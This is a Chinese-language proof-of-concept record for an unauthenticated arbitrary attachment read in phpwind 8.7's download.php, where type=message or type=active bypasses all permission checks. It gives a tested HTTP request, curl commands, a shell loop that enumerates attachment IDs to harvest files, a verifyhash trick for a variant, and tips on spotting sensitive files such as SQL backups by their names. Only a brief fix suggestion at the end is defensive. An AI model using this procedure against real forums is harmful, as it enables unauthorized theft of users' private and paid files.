# phpwind 8.7 download.php type=message 零鉴权越权读任意附件（游客可读）

- **code**: phpwind-8.7-download.php-type-message-零鉴权越权读任意附件-游客可读
- **kind**: poc
- **category**: unauthorized
- **component**: phpwind 8.7
- **severity**: high
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: 在 example.com（203.0.113.2:1852，phpwind example.com 20111111 / GBK / nginx）实测：同一 aid=8，`type=thread` → 200/24116B 提示页（被拦）；`type=message` → 200/68B 真实附件，`Content-Disposition: attachment; filename="probe1.gif"`。**游客无任何 Cookie** 请求 aid=8/aid=14 均成功读出（68B/44B）。aid=1/2/3/30/50/100/200 返回提示页（该站附件表仅含本次演练上传的记录，站点本身不使用附件功能）。
- **path**: pocs/phpwind-8.7-download.php-type-message-零鉴权越权读任意附件-游客可读/poc.http
- **tags**: phpwind,附件下载,越权,未授权访问,type参数,getDownloadFactory
- **created_at**: 2026-10-03T12:07:44.220Z
- **found_by**: exploit

## 描述

phpwind 8.7 download 接口的 $type 参数可切换下载器，message/active 两个下载器零鉴权，游客可绕过 threadDownload 的 8 道校验读取 pw_attachs 中任意 aid 的附件（含原始文件名）

## 用法

```
1) 确认目标为 phpwind（`/example.com` 含 `<meta name="generator" content="phpwind`）。
2) 直接请求：`curl "http://TARGET/example.com?action=download&aid=1&type=message"`（无需 Cookie）。
3) 遍历 `aid`：`for i in $(seq 1 200); do curl -s -o /dev/null -w "$i %{size_download}\n" "http://TARGET/example.com?action=download&aid=$i&type=message"; done`
   大字节数（非 24000+ 的提示页）即为命中的真实附件。
4) 取 `Content-Disposition` 的原始文件名判断敏感度，再按需取内容。
5) 对照实验：同 aid 换 `type=thread` 应返回提示页（被 8 道校验拦下），以确认漏洞点。
```

## 正文

```
# phpwind 8.7 / 9.x download 接口 type 参数越权（未授权读任意附件）

## 原理
`example.com?action=download` 的 `$type` 参数经 `getDownloadFactory($type)` 分发到**不同的下载器类**，
各类的鉴权强度天差地别 —— `$type` 实质是"选择校验强度"而非"限定数据源"：

| type | 类 | 鉴权 |
|---|---|---|
| （空）/ 其它 | `threadDownload` | **8 道**：attachurl 非空且无 `..` / `is_readable` / `geturl` 有效 / 版块 `allowdownload` / 组 `_G['allowdownload']` / `checkDownloadCredit` / `checkNeedCredit` |
| `message` | `messageDownload` | **0 道** |
| `active` | `activeDownload` | **0 道** |

`messageDownload::init()` 只做 `SELECT * FROM pw_attachs WHERE aid=<int>`（注意：查的是论坛附件表），
`execute()` 仅判 `empty($attach)` 与 `geturl()`，**不判登录、不判所有者、不判版块、不判积分**。

## 源码位置（phpwind 8.7）
- `actions/job/target162.example.com:156-167` `getDownloadFactory($type)` 分发
- `actions/job/target162.example.com:188-214` `messageDownload`（0 校验）
- `actions/job/target162.example.com:216-242` `activeDownload`（0 校验）
- `actions/job/target162.example.com:460-485` `threadDownload::check()`（8 校验）
- `actions/job/target162.example.com:487-514` `threadDownload::_checkForum()`

## POC（游客即可，无需任何 Cookie）
```http
GET /example.com?action=download&aid=1&type=message HTTP/1.1
Host: <target>
User-Agent: Mozilla/5.0
Referer: http://<target>/example.com
Connection: close
```
`aid` 遍历（1,2,3,...）即可枚举站内全部附件；响应 `Content-Disposition` 直接泄露**原始文件名**
（常含业务语义，如"用户表.xls""备份.sql"），`Content-Type` 与 body 即文件原文。

## 变体
- `type=active` → `pw_actattachs` 表，同样 0 校验
- 加 `&verify=<verifyhash>`（页面 JS 变量 `var verifyhash='...'` 可读）可同时过 `PostCheck` 类入口

## 影响
未授权读取任意附件（含他人附件、付费/积分受限附件）+ 原始文件名泄露；配合文件名可定位敏感数据。

## 修复建议
在 `messageDownload` / `activeDownload` 的 `init()`/`execute()` 中补齐与 `threadDownload::check()`
等价的鉴权（登录态、所有者或版块/组权限、积分校验），或强制 `$type` 只作为数据源白名单并统一走 `check()`。
```
